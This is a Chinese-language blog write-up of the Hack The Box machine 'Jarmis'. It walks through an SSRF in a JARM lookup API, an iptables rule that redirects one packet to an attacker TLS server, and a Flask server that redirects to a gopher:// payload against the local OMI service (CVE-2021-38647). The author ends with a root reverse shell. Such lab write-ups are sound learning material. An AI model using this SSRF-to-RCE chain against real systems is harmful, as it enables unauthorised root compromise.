---
title: HTB_Jarmis
layout: "post"
---
好久没有在博客上发文章了，暑假忙着考OSWE一直没有写东西，上个月抽空给博客换了个主题，加了一个工具页，顺便把以前的低质量水文都清除掉了，这篇文章记录一下这两天在做的一道很有意思的HTB机器。  

## 主要策略

重定向特定请求，构造Gopher包SSRF_2_RCE

## 有关技巧

识别SSRF点，构造恶意TLS服务重定向请求，iptables过滤重定向指定包

## Recon

常规RECON略过不提，22，80端口，ubuntu 20.04， 访问80端口提示需要HOST头，修改HOSTS文件加上，再次访问，一个简易的网站：
![img](/assets/posts/jarmis/1.jpg)  
告诉我们这个网站是用来查找Jarm Hash的，我之前从来没听说过这玩意，放狗找了下大概是用hash来构造一个TLS服务的数据库，快速鉴别恶意服务。  
对几个用户输入点一顿FUZZ，啥结果没有。  
尝试暴力FUZZ子域名，啥也没有。  
尝试对网页路径进行爆破，爆出一个docs路径，是api接口的手册  
![img](/assets/posts/jarmis/2.jpg)  
第三个接口很有意思，具备发起请求的能力，马上本地起一个TLS服务试一试，注意这里说will grab metadata,是之后SSRF的关键  
![img](/assets/posts/jarmis/3.jpg)  
![img](/assets/posts/jarmis/4.jpg)  
收到回复，第一时间想到ssrf，于是测试127.0.0.1，这里我中招了浪费的好久时间，127.0.0.1等一系列都被过滤的很好，只有localhost能用  
先用这个SSRF点对本地端口进行扫描
![img](/assets/posts/jarmis/5.jpg)  
22，80 已知，新出现了5986和8001.因为80的端口是nginx反向代理，所以估计8001是本地监听的http服务，八成就是要打5986端口上的服务，然而5985，5986一般是windows的winrm服务，之前已知这台机器是Ubuntu，很奇怪，一开始以为是虚拟机，放狗找不到说SSRF能打winRM的，后来看到一篇文章，5986端口在Linux上有可能是OMI服务，有个CVE-2021-38647( OMIGod)能RCE，POC是简单HTTP POST请求，估计就是它了。这个服务5985和5986一般是成对存在的，我手动测5985也是活得，工具没有显示出来应该是timeout10秒设置太短了  

## exploit

然而，我们能控制服务发起一个请求，却无法控制请求的内容，这种SSRF一般都要用到重定向，然而我之前起的nc ssl服务，并没有看到能重定向的请求，这时前面说的会对恶意服务，抓元数据就是一个很明显的提示了，首先要先知道这个服务数据库里面存着那些恶意服务  
`for i in $(seq 0 222); do curl http://jarmis.htb/api/v1/search/id/$i>> jarms.json;done`  
先把数据下载下来，然后用jq分析  
`cat jarms.json| jq | less`  
`cat jarms.json | jq '. | select(.ismalicious==true)' | less`  
![img](/assets/posts/jarmis/6.jpg)  
`cat jarms.json | jq -c '. | select(.ismalicious==true) | [.id, .note]'`  
![img](/assets/posts/jarmis/7.jpg)  
起一个其中的metasploit看看是怎么抓元数据的,同时，起一个wireshark抓包  
这里又遇到一个恶心的点，我的handler的jarmhash和数据库里的对不上，一直抓不到抓元数据的包，本来直接用http_basic.rb模块应该是很方便的。  
没办法，只能换ncat  
测试出只要jarm匹配，他就会发一个包去抓元数据，因此，重定向这个包来做SSRF。  
可是因为用不了msf，筛选包的任务就落到别的程序上了，还好，iptables有这个功能。  
翻了翻man page 构造出下列命令  
`sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443`  
把发往我机器443端口的包，每11个包一组，在路由前，每匹配到10个包，就开始重定向到8443端口，也就刚好重定向第11个包。  

```text
$nc --ssl -lnp 8443
GET / HTTP/1.1
Host: 10.10.14.6
User-Agent: curl/7.74.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

收到请求  

接下来就常规了，这个包是https的，所以为了方便，我起了个Flask  

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)    


@app.route('/')    
def root():    
    return redirect('gopher://127.0.0.1:5985/_{gopher_Exp})', code=301)#这里打5985，5985和5986的区别就像80和443
    
    
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```

反弹rootshell

```text
$nc -lnp 4444
bash: cannot set terminal process group (32938): Inappropriate ioctl for device
bash: no job control in this shell
root@Jarmis:/var/opt/microsoft/scx/tmp#
```

## 总结

总的来说还是比较直观的一道题，iptables过滤包很有意思。  
